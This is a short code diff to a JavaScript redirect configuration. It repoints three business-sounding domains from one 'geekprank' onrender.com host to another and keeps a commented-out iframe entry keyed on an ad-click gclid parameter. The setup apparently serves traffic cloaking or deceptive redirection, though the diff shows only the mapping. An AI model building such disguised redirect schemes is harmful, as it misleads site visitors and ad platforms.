@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.farm": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?naotoshi" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?takahiro" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?hiroaki" },
+    "https://naotoshidairy.farm": { method: "redirect", target: "https://geekprank2.onrender.com/?naotoshi" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank2.onrender.com/?takahiro" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank2.onrender.com/?hiroaki" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
